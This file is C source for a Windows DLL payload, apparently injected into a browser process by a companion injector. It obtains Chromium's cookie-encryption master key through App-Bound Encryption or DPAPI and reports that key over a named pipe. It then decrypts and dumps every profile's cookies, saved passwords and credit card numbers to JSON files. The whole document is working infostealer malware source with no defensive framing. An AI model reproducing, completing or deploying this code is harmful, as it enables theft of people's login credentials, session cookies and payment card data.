#include "payload.h"
#include "rdi.h"
#include "../abe/elevator.h"
#include "../crypto/aes_gcm.h"
#include "../utils/json_writer.h"
#include "../utils/strutil.h"
#include <sqlite3.h>
#include <stdio.h>
#include <stdlib.h>
#include <shlobj.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

#define CHROME_COOKIE_HEADER_LEN 32

static BOOL send_pipe_msg(HANDLE pipe, BYTE type, const void* data, DWORD len) {
    PIPE_MSG hdr = { .type = type, .length = len };
    DWORD written;
    if (!WriteFile(pipe, &hdr, sizeof(hdr), &written, NULL))
        return FALSE;
    if (len > 0 && data)
        return WriteFile(pipe, data, len, &written, NULL);
    return TRUE;
}

static void extract_cookies(sqlite3* db, const BYTE* master_key,
                            const char* browser_name, const char* profile_name,
                            const char* output_dir) {
    char out_path[MAX_PATH];
    snprintf(out_path, MAX_PATH, "%s\\%s_%s_cookies.json", output_dir, browser_name, profile_name);

    JSON_WRITER jw;
    if (!jw_open(&jw, out_path))
        return;

    jw_begin_array(&jw);

    sqlite3_stmt* stmt;
    const char* sql = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
        jw_end_array(&jw);
        jw_close(&jw);
        return;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char* host = (const char*)sqlite3_column_text(stmt, 0);
        const char* name = (const char*)sqlite3_column_text(stmt, 1);
        const char* path = (const char*)sqlite3_column_text(stmt, 2);
        int secure       = sqlite3_column_int(stmt, 3);
        int httponly     = sqlite3_column_int(stmt, 4);
        long long expires = sqlite3_column_int64(stmt, 5);

        const BYTE* blob = (const BYTE*)sqlite3_column_blob(stmt, 6);
        int blob_len     = sqlite3_column_bytes(stmt, 6);

        if (!blob || blob_len <= AES_GCM_OVERHEAD)
            continue;

        DWORD pt_len;
        PBYTE pt = aes_gcm_decrypt(blob, blob_len, master_key, &pt_len);
        if (!pt)
            continue;

        // Chrome cookies have a 32-byte header after decryption
        char* value;
        if (pt_len > CHROME_COOKIE_HEADER_LEN) {
            value = (char*)malloc(pt_len - CHROME_COOKIE_HEADER_LEN + 1);
            memcpy(value, pt + CHROME_COOKIE_HEADER_LEN, pt_len - CHROME_COOKIE_HEADER_LEN);
            value[pt_len - CHROME_COOKIE_HEADER_LEN] = 0;
        } else {
            value = (char*)malloc(pt_len + 1);
            memcpy(value, pt, pt_len);
            value[pt_len] = 0;
        }
        free(pt);

        jw_begin_object(&jw);
        jw_kv_string(&jw, "host", host ? host : "");
        jw_kv_string(&jw, "name", name ? name : "");
        jw_kv_string(&jw, "path", path ? path : "");
        jw_kv_bool(&jw, "secure", secure);
        jw_kv_bool(&jw, "httponly", httponly);
        jw_kv_int(&jw, "expires_utc", expires);
        jw_kv_string(&jw, "value", value);
        jw_end_object(&jw);

        free(value);
    }

    sqlite3_finalize(stmt);
    jw_end_array(&jw);
    jw_close(&jw);
}

static void extract_passwords(sqlite3* db, const BYTE* master_key,
                               const char* browser_name, const char* profile_name,
                               const char* output_dir) {
    char out_path[MAX_PATH];
    snprintf(out_path, MAX_PATH, "%s\\%s_%s_passwords.json", output_dir, browser_name, profile_name);

    JSON_WRITER jw;
    if (!jw_open(&jw, out_path))
        return;

    jw_begin_array(&jw);

    sqlite3_stmt* stmt;
    const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
        jw_end_array(&jw);
        jw_close(&jw);
        return;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char* url  = (const char*)sqlite3_column_text(stmt, 0);
        const char* user = (const char*)sqlite3_column_text(stmt, 1);

        const BYTE* blob = (const BYTE*)sqlite3_column_blob(stmt, 2);
        int blob_len     = sqlite3_column_bytes(stmt, 2);

        if (!blob || blob_len <= AES_GCM_OVERHEAD)
            continue;

        DWORD pt_len;
        PBYTE pt = aes_gcm_decrypt(blob, blob_len, master_key, &pt_len);
        if (!pt) continue;

        char* pass = (char*)malloc(pt_len + 1);
        memcpy(pass, pt, pt_len);
        pass[pt_len] = 0;
        free(pt);

        jw_begin_object(&jw);
        jw_kv_string(&jw, "url", url ? url : "");
        jw_kv_string(&jw, "username", user ? user : "");
        jw_kv_string(&jw, "password", pass);
        jw_end_object(&jw);

        SecureZeroMemory(pass, pt_len);
        free(pass);
    }

    sqlite3_finalize(stmt);
    jw_end_array(&jw);
    jw_close(&jw);
}

static void extract_payments(sqlite3* db, const BYTE* master_key,
                              const char* browser_name, const char* profile_name,
                              const char* output_dir) {
    char out_path[MAX_PATH];
    snprintf(out_path, MAX_PATH, "%s\\%s_%s_payments.json", output_dir, browser_name, profile_name);

    JSON_WRITER jw;
    if (!jw_open(&jw, out_path))
        return;

    jw_begin_array(&jw);

    sqlite3_stmt* stmt;
    const char* sql = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
        jw_end_array(&jw);
        jw_close(&jw);
        return;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char* cardholder = (const char*)sqlite3_column_text(stmt, 0);
        int exp_month = sqlite3_column_int(stmt, 1);
        int exp_year  = sqlite3_column_int(stmt, 2);

        const BYTE* blob = (const BYTE*)sqlite3_column_blob(stmt, 3);
        int blob_len     = sqlite3_column_bytes(stmt, 3);

        if (!blob || blob_len <= AES_GCM_OVERHEAD)
            continue;

        DWORD pt_len;
        PBYTE pt = aes_gcm_decrypt(blob, blob_len, master_key, &pt_len);
        if (!pt) continue;

        char* card_num = (char*)malloc(pt_len + 1);
        memcpy(card_num, pt, pt_len);
        card_num[pt_len] = 0;
        free(pt);

        jw_begin_object(&jw);
        jw_kv_string(&jw, "cardholder", cardholder ? cardholder : "");
        jw_kv_int(&jw, "exp_month", exp_month);
        jw_kv_int(&jw, "exp_year", exp_year);
        jw_kv_string(&jw, "card_number", card_num);
        jw_end_object(&jw);

        SecureZeroMemory(card_num, pt_len);
        free(card_num);
    }

    sqlite3_finalize(stmt);
    jw_end_array(&jw);
    jw_close(&jw);
}

static void process_profile(BROWSER_ID browser_id, const char* user_data_dir,
                             const char* profile_name, const BYTE* master_key,
                             const char* output_dir) {
    const BROWSER_CONFIG* cfg = &g_browsers[browser_id];
    int name_len = WideCharToMultiByte(CP_UTF8, 0, cfg->name, -1, NULL, 0, NULL, NULL);
    char* browser_name = (char*)malloc(name_len);
    WideCharToMultiByte(CP_UTF8, 0, cfg->name, -1, browser_name, name_len, NULL, NULL);

    // Build paths to databases
    char cookies_path[MAX_PATH], login_path[MAX_PATH], webdata_path[MAX_PATH];
    snprintf(cookies_path, MAX_PATH, "%s\\%s\\Network\\Cookies", user_data_dir, profile_name);
    snprintf(login_path, MAX_PATH, "%s\\%s\\Login Data", user_data_dir, profile_name);
    snprintf(webdata_path, MAX_PATH, "%s\\%s\\Web Data", user_data_dir, profile_name);

    // Copy databases to temp (browser holds locks)
    struct { const char* src; const char* table_check; void (*extract)(sqlite3*, const BYTE*, const char*, const char*, const char*); } dbs[] = {
        { cookies_path,  "cookies",      extract_cookies   },
        { login_path,    "logins",       extract_passwords },
        { webdata_path,  "credit_cards", extract_payments  },
    };

    for (int i = 0; i < 3; i++) {
        char* tmp = copy_to_temp(dbs[i].src);
        if (!tmp) continue;

        sqlite3* db;
        if (sqlite3_open_v2(tmp, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
            dbs[i].extract(db, master_key, browser_name, profile_name, output_dir);
            sqlite3_close(db);
        }
        DeleteFileA(tmp);
        free(tmp);
    }

    free(browser_name);
}

static void enumerate_profiles(BROWSER_ID browser_id, const char* user_data_dir,
                                const BYTE* master_key, const char* output_dir) {
    // Check Default profile and Profile N (1-99)
    char profile_dir[MAX_PATH];
    snprintf(profile_dir, MAX_PATH, "%s\\Default", user_data_dir);
    if (GetFileAttributesA(profile_dir) != INVALID_FILE_ATTRIBUTES)
        process_profile(browser_id, user_data_dir, "Default", master_key, output_dir);

    for (int i = 1; i < 100; i++) {
        char name[32];
        snprintf(name, sizeof(name), "Profile %d", i);
        snprintf(profile_dir, MAX_PATH, "%s\\%s", user_data_dir, name);
        if (GetFileAttributesA(profile_dir) == INVALID_FILE_ATTRIBUTES)
            break;
        process_profile(browser_id, user_data_dir, name, master_key, output_dir);
    }
}

void CALLBACK payload_main(ULONG_PTR param) {
    // Connect to injector's named pipe
    char pipe_name[128];
    snprintf(pipe_name, sizeof(pipe_name), PIPE_NAME_FMT, GetCurrentProcessId());

    HANDLE pipe = CreateFileA(pipe_name, GENERIC_READ | GENERIC_WRITE,
                              0, NULL, OPEN_EXISTING, 0, NULL);
    if (pipe == INVALID_HANDLE_VALUE)
        return;

    send_pipe_msg(pipe, MSG_READY, NULL, 0);

    // Read browser ID from pipe
    PIPE_MSG msg;
    DWORD read_bytes;
    ReadFile(pipe, &msg, sizeof(msg), &read_bytes, NULL);
    if (msg.type != MSG_BROWSER_ID) { CloseHandle(pipe); return; }
    BROWSER_ID browser_id;
    ReadFile(pipe, &browser_id, sizeof(browser_id), &read_bytes, NULL);

    // Read output directory
    ReadFile(pipe, &msg, sizeof(msg), &read_bytes, NULL);
    if (msg.type != MSG_OUTPUT_DIR) { CloseHandle(pipe); return; }
    char output_dir[MAX_PATH] = {0};
    ReadFile(pipe, output_dir, msg.length, &read_bytes, NULL);

    const BROWSER_CONFIG* cfg = &g_browsers[browser_id];

    // Build path to Local State
    char* user_data = build_local_path(cfg->user_data_path);
    if (!user_data) {
        send_pipe_msg(pipe, MSG_STATUS, "ERR:no_user_data", 16);
        CloseHandle(pipe);
        return;
    }

    char local_state[MAX_PATH];
    snprintf(local_state, MAX_PATH, "%s\\Local State", user_data);

    // Extract encryption key (ABE or DPAPI fallback)
    DWORD enc_key_len;
    KEY_TYPE key_type;
    PBYTE enc_key = extract_browser_key(local_state, &enc_key_len, &key_type);
    if (!enc_key || key_type == KEY_NONE) {
        char err_buf[128];
        snprintf(err_buf, sizeof(err_buf), "ERR:no_key (tried %s)", local_state);
        send_pipe_msg(pipe, MSG_STATUS, err_buf, (DWORD)strlen(err_buf) + 1);
        free(user_data);
        CloseHandle(pipe);
        return;
    }

    BYTE* master_key = NULL;
    DWORD master_key_len = 0;

    if (key_type == KEY_ABE) {
        send_pipe_msg(pipe, MSG_STATUS, "KEY:ABE", 8);

        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

        HRESULT hr = elevator_decrypt_key(browser_id, enc_key, enc_key_len,
                                           &master_key, &master_key_len);
        free(enc_key);

        if (FAILED(hr) || !master_key) {
            char err_buf[64];
            snprintf(err_buf, sizeof(err_buf), "ERR:abe_fail hr=0x%08lX", (unsigned long)hr);
            send_pipe_msg(pipe, MSG_STATUS, err_buf, (DWORD)strlen(err_buf) + 1);
            free(user_data);
            CoUninitialize();
            CloseHandle(pipe);
            return;
        }
    } else {
        // DPAPI key — decrypt with CryptUnprotectData
        send_pipe_msg(pipe, MSG_STATUS, "KEY:DPAPI", 10);

        DATA_BLOB in_blob  = { .cbData = enc_key_len, .pbData = enc_key };
        DATA_BLOB out_blob = {0};

        if (!CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
            char err_buf[64];
            snprintf(err_buf, sizeof(err_buf), "ERR:dpapi_fail gle=%lu", GetLastError());
            send_pipe_msg(pipe, MSG_STATUS, err_buf, (DWORD)strlen(err_buf) + 1);
            free(enc_key);
            free(user_data);
            CloseHandle(pipe);
            return;
        }
        free(enc_key);

        master_key_len = out_blob.cbData;
        master_key = (BYTE*)malloc(master_key_len);
        memcpy(master_key, out_blob.pbData, master_key_len);
        LocalFree(out_blob.pbData);
    }

    // Send master key to injector (for logging/verification)
    send_pipe_msg(pipe, MSG_KEY_DATA, master_key, master_key_len);

    // Create output directory
    CreateDirectoryA(output_dir, NULL);

    // Enumerate profiles and extract data
    enumerate_profiles(browser_id, user_data, master_key, output_dir);

    SecureZeroMemory(master_key, master_key_len);
    free(master_key);
    free(user_data);
    if (key_type == KEY_ABE)
        CoUninitialize();

    send_pipe_msg(pipe, MSG_DONE, NULL, 0);
    CloseHandle(pipe);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
    }
    return TRUE;
}
